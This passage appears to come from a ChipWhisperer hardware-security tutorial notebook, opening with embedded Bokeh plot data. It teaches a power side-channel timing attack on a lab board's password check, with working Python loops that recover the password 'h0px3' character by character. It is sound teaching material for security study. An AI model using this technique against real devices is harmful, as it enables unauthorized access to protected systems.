wAAAAAAQLG/AAAAAACArz8AAAAAAMC1vwAAAAAAAKY/AAAAAAAAhL8AAAAAAMC6PwAAAAAAQLO/AAAAAACAqz8AAAAAAABwPwAAAAAAwL4/AAAAAAAArL8AAAAAAICsPwAAAAAAAIy/AAAAAADAtj8AAAAAAMDCvwAAAAAAAJC/AAAAAACAsL8AAAAAAICtPwAAAAAAgLi/AAAAAAAAmj8AAAAAAICkvwAAAAAAALM/AAAAAABAvL8AAAAAAACSPwAAAAAAAKK/AAAAAACAtT8AAAAAAMCzvwAAAAAAgKE/AAAAAACAo78AAAAAAMCyPwAAAAAAgL+/AAAAAAAAaD8AAAAAAACrvwAAAAAAALA/AAAAAABAsr8AAAAAAACnPwAAAAAAAIq/AAAAAACAuT8AAAAAAMDEvwAAAAAAAJi/AAAAAAAAr78AAAAAAMCwPwAAAAAAQLq/AAAAAAAAkz8AAAAAAAClvwAAAAAAALM/AAAAAADgxL8AAAAAAACdvwAAAAAAALK/AAAAAACAqD8AAAAAAKDDvwAAAAAAAJq/AAAAAABAtL8AAAAAAICmPwAAAAAAwMq/AAAAAAAAr78AAAAAAIC4vwAAAAAAAKQ/AAAAAABQ0r8AAAAAACDBvwAAAAAAYMS/AAAAAAAAk78AAAAAAIDIvwAAAAAAAKq/AAAAAACAtr8AAAAAAIClPwAAAAAAwMW/AAAAAAAAnL8AAAAAAACwvwAAAAAAwLA/AAAAAAAAuL8AAAAAAAChPwAAAAAAAJS/AAAAAACAuT8AAAAAAAC0vwAAAAAAAKo/AAAAAAAAYD8AAAAAAIC+PwAAAAAAALC/AAAAAAAAqj8AAAAAAACTvwAAAAAAQLc/AAAAAACgwr8AAAAAAACQvwAAAAAAQLC/AAAAAACAqz8AAAAAAIC7vwAAAAAAAJA/AAAAAACApb8AAAAAAMCyPwAAAAAAwLq/AAAAAAAAlT8AAAAAAACjvwAAAAAAwLQ/AAAAAABAsL8AAAAAAICnPwAAAAAAAJq/AAAAAADAtD8AAAAAAIC8vwAAAAAAAHQ/AAAAAACAqb8AAAAAAMCwPwAAAAAAgLK/AAAAAAAAqT8AAAAAAACEvwAAAAAAALo/AAAAAADgxL8AAAAAAACevwAAAAAAQLC/AAAAAABAsD8AAAAAAEC4vwAAAAAAAJo/AAAAAACAor8AAAAAAMCzPwAAAAAAgMa/AAAAAAAApL8AAAAAAAC0vwAAAAAAAKk/AAAAAADAxr8AAAAAAICnvwAAAAAAALi/AAAAAAAAmj8AAAAAAIDMvwAAAAAAALK/AAAAAABAub8AAAAAAACjPwAAAAAAANG/AAAAAABAvr8AAAAAAKDDvwAAAAAAAIy/AAAAAAAgyL8AAAAAAACmvwAAAAAAgLS/AAAAAACAqD8AAAAAAKDFvwAAAAAAgKG/AAAAAABAsb8AAAAAAACvPwAAAAAAALe/AAAAAAAApD8AAAAAAACMvwAAAAAAgLo/AAAAAACAsr8AAAAAAACtPwAAAAAAAIA/AAAAAABAvz8AAAAAAICovwAAAAAAALA/AAAAAAAAgr8AAAAAAAC4PwAAAAAAgMO/AAAAAAAAl78AAAAAAICxvwAAAAAAgKs/AAAAAABAu78AAAAAAACRPwAAAAAAAKW/AAAAAADAsT8AAAAAAIC4vwAAAAAAAJw/AAAAAAAAnL8AAAAAAMC2PwAAAAAAAK2/AAAAAAAAqj8AAAAAAACcvw==","dtype":"float64","shape":[2000]}},"selected":{"id":"1163","type":"Selection"},"selection_policy":{"id":"1162","type":"UnionRenderers"}},"id":"1136","type":"ColumnDataSource"},{"attributes":{},"id":"1164","type":"UnionRenderers"},{"attributes":{"line_alpha":0.1,"line_color":"#1f77b4","x":{"field":"x"},"y":{"field":"y"}},"id":"1138","type":"Line"},{"attributes":{"dimension":1,"ticker":{"id":"1117","type":"BasicTicker"}},"id":"1120","type":"Grid"}],"root_ids":["1102"]},"title":"Bokeh Application","version":"1.2.0"}};
      var render_items = [{"docid":"c057968c-a157-4ef3-8186-c570b860e3f6","roots":{"1102":"97bd1eca-0966-47ce-bb6a-711587980636"}}];
      root.Bokeh.embed.embed_items_notebook(docs_json, render_items);
    
      }
      if (root.Bokeh !== undefined) {
        embed_document(root);
      } else {
        var attempts = 0;
        var timer = setInterval(function(root) {
          if (root.Bokeh !== undefined) {
            embed_document(root);
            clearInterval(timer);
          }
          attempts++;
          if (attempts > 100) {
            console.log("Bokeh: ERROR: Unable to run BokehJS code because BokehJS library is missing");
            clearInterval(timer);
          }
        }, 10, root)
      }
    })(window);
    </script>
    </div>

You should see both traces start and end similarly, but differ
elsewhere. If you look closely, you should see that the blue trace looks
a lot like the red trace but shifted later in time. We'll use this
timing difference to break the password!

Edit the above block to try different passwords and see how it changes
for different lengths and number of correct characters.

Go back to the original guesses (``"\n"`` and ``"h\n"``) and find some
distinct spikes that get shifted in time. Your target may differ, but in
my case, there were some distinct spikes of about -0.21 at 217 in red
and 253 in blue. The plot is interactive, so you can zoom in and move
around using the buttons on the right side of the plot. Record their
locations, value, and the difference in location (in my case, 217, 253,
-0.21, and 36).

Attacking a Single Letter
-------------------------

Now that we've located a distinctive timing difference, we can start
building our attack. We'll start with a single letter, since that will
quickly give us some feedback on the attack.

The plan for the attack is simple: keep guessing letters until we no
longer see the distinctive spike in the original location. To do this,
we'll create a loop that: \* Figures out our next guess \* Does the
capture and records the trace \* Checks if sample 217 is larger than
-0.2 (replace with appropriate values)

The below loop finds the first correct character, prints it, then ends.
You should see "Success: h" after a while.


**In [15]:**

.. code:: ipython3

    trylist = "abcdefghijklmnopqrstuvwxyz0123456789"
    password = ""
    for c in trylist:
        next_pass = password + c + "\n"
        trace = cap_pass_trace(next_pass)
        if trace[121] > -0.3:
            print("Success: " + c)
            break


**Out [15]:**



.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    




.. parsed-literal::

    Success: h
    


Attacking the Full Password
---------------------------

Now that we can guess a single character, attacking the rest is easy; we
just need to repeat the process in another loop, move the check point
(this is the change is location you recorded earlier), and update our
guess with the new correct letter.

After updating the below script and running it, you should see parts of
the password printed out as each letter is found.


**In [16]:**

.. code:: ipython3

    trylist = "abcdefghijklmnopqrstuvwxyz0123456789"
    password = ""
    def checkpass(trace, i):
        if PLATFORM == "CWNANO":
            #There's a bit of jitter
            return (trace[228 + 11*i] < 3 and trace[227 + 11*i] < 0.3)
        elif PLATFORM == "CWLITEARM" or PLATFORM == "CW308_STM32F3":
            return trace[229 + 36*i] > -0.2
        elif PLATFORM == "CW303" or PLATFORM == "CWLITEXMEGA":
            return trace[121 + 72 * i] > -0.3
    
    for i in range(5):
        for c in trylist:
            next_pass = password + c + "\n"
            trace = cap_pass_trace(next_pass)
            if checkpass(trace, i):
                password += c
                print("Success, pass now {}".format(password))
                break


**Out [16]:**



.. parsed-literal::

    Success, pass now h
    Success, pass now h0
    Success, pass now h0p
    Success, pass now h0px
    Success, pass now h0px3
    


That's it! You should have successfully cracked a password using the
timing attack. Some notes on this method: \* The target device has a
finite start-up time, which slows down the attack. If you wish, remove
some of the ``printf()``'s from the target code, recompile and
reprogram, and see how quickly you can do this attack. \* The current
script doesn't look for the "WELCOME" message when the password is OK.
That is an extension that allows it to crack any size password. \* If
there was a lock-out on a wrong password, the system would ignore it, as
it resets the target after every attempt.

Conclusion
----------

This tutorial has demonstrated the use of the power side-channel for
performing timing attacks. A target with a simple password-based
security system is broken.


**In [17]:**

.. code:: ipython3

    scope.dis()
    target.dis()

Tests
-----


**In [18]:**

.. code:: ipython3

    assert (password == "h0px3"), "Failed to break password, got {}.\nIf on Nano, may need to rerun".format(password)


**In [ ]:**

